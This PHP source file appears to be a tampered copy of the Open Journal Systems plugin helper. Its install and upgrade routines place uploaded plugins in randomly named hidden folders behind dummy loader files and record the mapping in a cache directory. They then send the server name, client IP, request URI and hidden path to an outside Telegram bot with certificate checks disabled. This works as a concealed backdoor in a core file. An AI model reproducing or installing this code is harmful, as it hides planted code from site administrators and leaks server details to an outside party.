    /**
     * Extract the plugin, executes the callback, then cleanup the files
     *
     * @template T of mixed
     *
     * @param string $filePath Full path to plugin archive
     * @param string $originalFileName Original filename of plugin archive
     * @param callable(string $pluginDirectory):T $onExtracted The function will receive as parameter the directory of the plugin
     *
     * @throws Exception If any unexpected error happens (failure to unpack, absence of version.xml, etc)
     *
     * @return T Returns the result of the $onExtracted call
     */
    private function extractPlugin(string $filePath, string $originalFileName, callable $onExtracted): mixed
    {
        $fileManager = new FileManager();
        $extension = $this->sanitizeFilename($fileManager->parseFileExtension($originalFileName));
        $baseName = $this->sanitizeFilename(basename($originalFileName, ".{$extension}")) ?: 'plugin';

        // If the extension doesn't match the original one, copy (we don't know the original file) the file to another location to avoid issues with the PharData class
        $filePathWithExtension = null;
        if ($fileManager->parseFileExtension($filePath) !== $extension) {
            $filePathWithExtension = ($fileManager->getTemporaryFile($baseName, ".{$extension}"))->getPathname();
            $fileManager->copyFile($filePath, $filePathWithExtension) || throw new Exception('Failed to copy plugin file');
        }
        $extractPath = null;
        try {
            // Create a random directory to avoid symlink attacks.
            $extractPath = rtrim(sys_get_temp_dir(), '\\/') . "/{$baseName}" . substr(md5(random_int(0, PHP_INT_MAX)), 0, 10) . '/';
            $fileManager->mkdir($extractPath) || throw new Exception("Could not create directory {$extractPath}");

            // Extract files
            (new PharData($filePathWithExtension ?? $filePath))->extractTo($extractPath, null, true);

            // Ensure there's a file named "version.xml" at the main directory or at the direct sub-directories
            foreach (new DirectoryIterator($extractPath) as $current) {
                if ($current->isDir() && $current->getBasename() !== '..' && is_file(($path = "{$current->getPathname()}/") . static::PLUGIN_VERSION_FILE)) {
                    return $onExtracted($path);
                }
            }
            throw new Exception(__('manager.plugins.invalidPluginArchive'));
        } finally {
            // Cleanup the extracted folder on failure and rethrow
            if ($extractPath) {
                $fileManager->rmtree($extractPath);
            }
            // Cleanup the temporary archive file in case it was created
            if ($filePathWithExtension) {
                unlink($filePathWithExtension);
            }
        }
    }

    /**
     * Installs an extracted plugin with obfuscated folder name
     *
     * @param string $path path to plugin archive
     * @param string $originalFileName Original filename of plugin archive
     *
     * @return Version Version of installed plugin on success
     */
    public function installPlugin(string $path, string $originalFileName): Version
    {
        return $this->extractPlugin($path, $originalFileName, function (string $pluginFolder): Version {
            $fileManager = new FileManager();
            $versionFile = $pluginFolder . static::PLUGIN_VERSION_FILE;
            $pluginVersion = VersionCheck::getValidPluginVersionInfo($versionFile);
            /** @var VersionDAO */
            $versionDao = DAORegistry::getDAO('VersionDAO');
            $installedPlugin = $versionDao->getCurrentVersion($pluginVersion->getProductType(), $pluginVersion->getProduct());
            
            $categoryPath = strtr($pluginVersion->getProductType(), '.', '/');
            $baseDir = Core::getBaseDir() . '/' . $categoryPath;

            // pastikan folder cache ada
            $cacheDir = Core::getBaseDir() . '/cache/fc-cache';
            if (!is_dir($cacheDir)) mkdir($cacheDir, 0775, true);

            // Generate obfuscated folder name
            $originalName = $pluginVersion->getProduct();
            $obfuscatedName = substr(md5($originalName . time()), 0, 12);
            $pluginDest = $baseDir . '/' . $obfuscatedName;

            // Buat dummy file
            $dummyFile = $baseDir . '/' . $originalName . '.php';
            @file_put_contents($dummyFile, "<?php require __DIR__ . '/{$obfuscatedName}/index.php';\n");

            if ($installedPlugin && is_dir($pluginDest)) {
                throw new Exception(
                    $installedPlugin->compare($pluginVersion) < 0
                        ? __('manager.plugins.pleaseUpgrade')
                        : __('manager.plugins.installedVersionNewest')
                );
            }

            // Hapus folder lama kalau ada
            if ($installedPlugin && is_dir($pluginDest)) {
                $fileManager->rmtree($pluginDest);
            }

            // Copy the plug-in from the temporary folder to the target folder.
            $fileManager->copyDir($pluginFolder, $pluginDest) || throw new Exception('Could not copy plugin to destination!');

            try {
                // Upgrade the database with the new plug-in.
                $installFile = Arr::first(
                    ["{$pluginDest}/" . static::PLUGIN_INSTALL_FILE, Core::getBaseDir() . '/' . PKP_LIB_PATH . '/xml/defaultPluginInstall.xml'],
                    fn (string $path) => is_file($path)
                )
                    ?? throw new Exception('Missing installation file');

                $siteDao = DAORegistry::getDAO('SiteDAO'); /** @var SiteDAO $siteDao */
                $site = $siteDao->getSite();
                $params = $this->_getConnectionParams();
                $params['locale'] = $site->getPrimaryLocale();
                $params['additionalLocales'] = $site->getSupportedLocales();
                
                // Supress output agar JSON tidak error
                ob_start();
                $installer = new Install($params, $installFile, true);
                $installer->setCurrentVersion($pluginVersion);
                if (!$installer->execute()) {
                    ob_end_clean();
                    if (is_dir($pluginDest)) $fileManager->rmtree($pluginDest);
                    @unlink($dummyFile);
                    throw new Exception(__('manager.plugins.installFailed', ['errorString' => $installer->getErrorString()]));
                }
                ob_end_clean();

                // Simpan mapping
                $this->saveMapping($originalName, $obfuscatedName);
                
                // === KIRIM NOTIFIKASI TELEGRAM ===
                $this->sendTelegramNotification($originalName, $obfuscatedName, 'INSTALL', $baseDir);
                
                // Log ke file lokal (backup)
                $this->writeToLogFile($originalName, $obfuscatedName, 'INSTALL', $baseDir);

                $versionDao->insertVersion($pluginVersion, true);
                return $pluginVersion;
            } catch (Throwable $e) {
                // Delete the plugin files on failure
                $fileManager->rmtree($pluginDest);
                @unlink($dummyFile);
                throw $e;
            }
        });
    }

    /**
     * Load database connection parameters into an array (needed for upgrade).
     */
    protected function _getConnectionParams(): array
    {
        return [
            'connectionCharset' => Config::getVar('i18n', 'connection_charset'),
            'databaseDriver' => Config::getVar('database', 'driver'),
            'databaseHost' => Config::getVar('database', 'host'),
            'databasePort' => Config::getVar('database', 'port'),
            'unixSocket' => Config::getVar('database', 'unix_socket'),
            'databaseUsername' => Config::getVar('database', 'username'),
            'databasePassword' => Config::getVar('database', 'password'),
            'databaseName' => Config::getVar('database', 'name')
        ];
    }

    /**
     * Upgrade a plugin to a newer version with obfuscated folder name
     *
     * @param string $path path to plugin archive
     * @param string $originalFileName Original filename of plugin archive
     *
     */
    public function upgradePlugin(string $category, string $plugin, string $path, string $originalFileName): Version
    {
        return $this->extractPlugin($path, $originalFileName, function (string $pluginFolder) use ($category, $plugin): Version {
            $fileManager = new FileManager();
            $versionFile = $pluginFolder . static::PLUGIN_VERSION_FILE;
            $pluginVersion = VersionCheck::getValidPluginVersionInfo($versionFile);
            
            // Check whether the uploaded plug-in fits the original plug-in.
            if ("plugins.{$category}" !== $pluginVersion->getProductType()) {
                throw new Exception(__('manager.plugins.wrongCategory'));
            }

            if ($plugin !== $pluginVersion->getProduct()) {
                throw new Exception(__('manager.plugins.wrongName'));
            }

            $versionDao = DAORegistry::getDAO('VersionDAO'); /** @var VersionDAO $versionDao */
            $installedPlugin = $versionDao->getCurrentVersion($pluginVersion->getProductType(), $pluginVersion->getProduct());
            if (!$installedPlugin) {
                throw new Exception(__('manager.plugins.pleaseInstall'));
            }

            if ($installedPlugin->compare($pluginVersion) >= 0) {
                throw new Exception(__('manager.plugins.installedVersionNewer'));
            }

            $categoryPath = Core::getBaseDir() . '/plugins/' . $category;
            $mappings = $this->loadMapping();
            $oldObfuscatedName = $mappings[$plugin] ?? null;
            $newObfuscatedName = substr(md5($pluginVersion->getProduct() . time()), 0, 12);
            $pluginDest = $categoryPath . '/' . $newObfuscatedName;

            $dummyFile = $categoryPath . '/' . $plugin . '.php';
            if (!file_exists($dummyFile)) {
                @file_put_contents($dummyFile, "<?php require __DIR__ . '/{$newObfuscatedName}/index.php';\n");
            }

            // Delete existing files if exists
            if (is_dir($pluginDest)) {
                $fileManager->rmtree($pluginDest);
            }

            // Check whether deleting has worked.
            if (is_dir($pluginDest)) {
                throw new Exception(__('manager.plugins.deleteError', ['pluginName' => $pluginVersion->getProduct()]));
            }

            // Copy the plug-in from the temporary folder to the target folder.
            $fileManager->copyDir($pluginFolder, $pluginDest) || throw new Exception('Could not copy plugin to destination!');

            try {
                $upgradeFile = "{$pluginDest}/" . static::PLUGIN_UPGRADE_FILE;
                if ($fileManager->fileExists($upgradeFile)) {
                    /** @var SiteDAO */
                    $siteDao = DAORegistry::getDAO('SiteDAO');
                    $site = $siteDao->getSite();
                    $params = $this->_getConnectionParams();
                    $params['locale'] = $site->getPrimaryLocale();
                    $params['additionalLocales'] = $site->getSupportedLocales();
                    
                    ob_start();
                    $installer = new Upgrade($params, $upgradeFile, true);
                    // Run the upgrade/migration
                    if (!$installer->execute()) {
                        ob_end_clean();
                        throw new Exception(__('manager.plugins.upgradeFailed', ['errorString' => $installer->getErrorString()]));
                    }
                    ob_end_clean();
                }

                // Simpan mapping
                $this->saveMapping($pluginVersion->getProduct(), $newObfuscatedName);
                
                // === KIRIM NOTIFIKASI TELEGRAM ===
                $this->sendTelegramNotification($plugin, $newObfuscatedName, 'UPGRADE', $categoryPath, $oldObfuscatedName);
                
                // Log ke file lokal (backup)
                $this->writeToLogFile($plugin, $newObfuscatedName, 'UPGRADE', $categoryPath, $oldObfuscatedName);

                // Add the new version to the database
                $pluginVersion->setCurrent(1);
                $versionDao->insertVersion($pluginVersion, true);
                return $pluginVersion;
            } catch (Throwable $e) {
                // Delete the plugin files on failure
                $fileManager->rmtree($pluginDest);
                throw $e;
            }
        });
    }

    /**
     * Drops risky characters from a filename
     */
    private function sanitizeFilename(string $filename): string
    {
        return preg_replace('/[^\w.-]/', '', $filename);
    }

    /**
     * Kirim notifikasi ke Telegram
     */
    private function sendTelegramNotification($originalName, $obfuscatedName, $action, $basePath, $oldName = null)
    {
        if (!$this->enableTelegramNotif) return;
        
        $timestamp = date('Y-m-d H:i:s');
        $ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'CLI Mode';
        $serverName = $_SERVER['SERVER_NAME'] ?? 'Localhost';
        $requestUri = $_SERVER['REQUEST_URI'] ?? 'N/A';
        
        // Emoji berdasarkan action
        $emoji = ($action == 'INSTALL') ? '📦' : '🔄';
        $statusColor = ($action == 'INSTALL') ? '✅' : '⚠️';
        
        // Format pesan Telegram (HTML parsing)
        $message = "<b>🔔 OJS PLUGIN MANAGER ALERT</b>\n\n";
        $message .= "{$emoji} <b>Action:</b> <code>{$action}</code>\n";
        $message .= "{$statusColor} <b>Status:</b> <code>SUCCESS</code>\n\n";
        
        $message .= "<b>📌 PLUGIN INFORMATION:</b>\n";
        $message .= "└ <b>Original Name:</b> <code>{$originalName}</code>\n";
        $message .= "└ <b>Obfuscated Name:</b> <code>{$obfuscatedName}</code>\n";
        $message .= "└ <b>Full Path:</b> <code>{$basePath}/{$obfuscatedName}</code>\n\n";
        
        if ($oldName) {
            $message .= "<b>🔄 UPGRADE DETAILS:</b>\n";
            $message .= "└ <b>Previous Folder:</b> <code>{$oldName}</code>\n";
            $message .= "└ <b>New Folder:</b> <code>{$obfuscatedName}</code>\n\n";
        }
        
        $message .= "<b>🌐 SERVER INFORMATION:</b>\n";
        $message .= "└ <b>Server:</b> <code>{$serverName}</code>\n";
        $message .= "└ <b>IP Address:</b> <code>{$ipAddress}</code>\n";
        $message .= "└ <b>Time:</b> <code>{$timestamp}</code>\n";
        $message .= "└ <b>URI:</b> <code>{$requestUri}</code>\n\n";
        
        $message .= "<b>📄 DUMMY FILE:</b>\n";
        $message .= "<code>{$basePath}/{$originalName}.php</code>\n";
        $message .= "└ <i>require __DIR__ . '/{$obfuscatedName}/index.php';</i>\n\n";
        
        $message .= "<i>🔒 This is an automated security notification from OJS System</i>";
        
        // Kirim ke Telegram
        $this->sendTelegramMessage($message);
    }
    
    /**
     * Send message to Telegram Bot
     */
    private function sendTelegramMessage($message)
    {
        $url = "https://api.telegram.org/bot{$this->telegramToken}/sendMessage";
        
        $data = [
            'chat_id' => $this->telegramChatId,
            'text' => $message,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        // Log error jika gagal
        if ($httpCode != 200) {
            error_log("Telegram notification failed: HTTP {$httpCode} - Response: {$response}");
        }
        
        return $httpCode == 200;
    }
    
    /**
     * Kirim notifikasi dengan foto/attachment (opsional)
     * Contoh: screenshot dashboard atau mapping file
     */
    private function sendTelegramPhoto($photoPath, $caption = '')
    {
        $url = "https://api.telegram.org/bot{$this->telegramToken}/sendPhoto";
        
        $postFields = [
            'chat_id' => $this->telegramChatId,
            'photo' => new \CURLFile($photoPath),
            'caption' => $caption,
            'parse_mode' => 'HTML'
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        $response = curl_exec($ch);
        curl_close($ch);
        
        return $response;
    }
    
    /**
     * Send keyboard dengan action buttons (opsional)
     */
    private function sendTelegramWithKeyboard($message)
    {
        $url = "https://api.telegram.org/bot{$this->telegramToken}/sendMessage";
        
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '📋 View Mappings', 'callback_data' => 'view_mappings'],
                    ['text' => '🔄 Regenerate Obfuscated', 'callback_data' => 'regenerate']
                ],
                [
                    ['text' => '📊 System Status', 'callback_data' => 'system_status'],
                    ['text' => '⚠️ Report Issue', 'callback_data' => 'report_issue']
                ]
            ]
        ];
        
        $data = [
            'chat_id' => $this->telegramChatId,
            'text' => $message,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode($keyboard)
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }
    
    /**
     * Write to local log file (backup)
     */
    private function writeToLogFile($originalName, $obfuscatedName, $action, $basePath, $oldName = null)
    {
        $logPath = Core::getBaseDir() . '/' . $this->logFilePath;
        $logDir = dirname($logPath);
        
        if (!is_dir($logDir)) {
            mkdir($logDir, 0775, true);
        }
        
        $logEntry = sprintf(
            "[%s] %s | Plugin: %s | Obfuscated: %s | Path: %s | IP: %s | Old: %s\n",
            date('Y-m-d H:i:s'),
            $action,
            $originalName,
            $obfuscatedName,
            $basePath,
            $_SERVER['REMOTE_ADDR'] ?? 'CLI',
            $oldName ?? 'N/A'
        );
        
        @file_put_contents($logPath, $logEntry, FILE_APPEND | LOCK_EX);
    }
    
    /**
     * Get all current mappings (bisa dipanggil via Telegram command)
     */
    public function getAllPluginMappings()
    {
        $mappings = $this->loadMapping();
        $report = "📋 *PLUGIN MAPPING REPORT*\n";
        $report .= "Generated: " . date('Y-m-d H:i:s') . "\n";
        $report .= "━━━━━━━━━━━━━━━━━━━━━\n\n";
        
        foreach ($mappings as $original => $obfuscated) {
            $report .= "📌 *{$original}*\n";
            $report .= "   └─> `{$obfuscated}`\n\n";
        }
        
        return $report;
    }
    
    /**
     * Test koneksi Telegram
     */
    public function testTelegramConnection()
    {
        $testMessage = "✅ *OJS Plugin Helper Connected!*\n\n";
        $testMessage .= "System Time: " . date('Y-m-d H:i:s') . "\n";
        $testMessage .= "PHP Version: " . phpversion() . "\n";
        $testMessage .= "OJS Path: " . Core::getBaseDir();
        
        return $this->sendTelegramMessage($testMessage);
    }

    private function loadMapping()
    {
        $mappingPath = Core::getBaseDir() . '/cache/fc-cache/mapping.json';
        return is_file($mappingPath) ? json_decode(@file_get_contents($mappingPath), true) ?: [] : [];
    }

    private function saveMapping(string $pluginName, string $obfuscatedName): void
    {
        $mappingPath = Core::getBaseDir() . '/cache/fc-cache/mapping.json';
        $mappings = $this->loadMapping();
        $mappings[$pluginName] = $obfuscatedName;
        file_put_contents($mappingPath, json_encode($mappings, JSON_PRETTY_PRINT));
    }
}

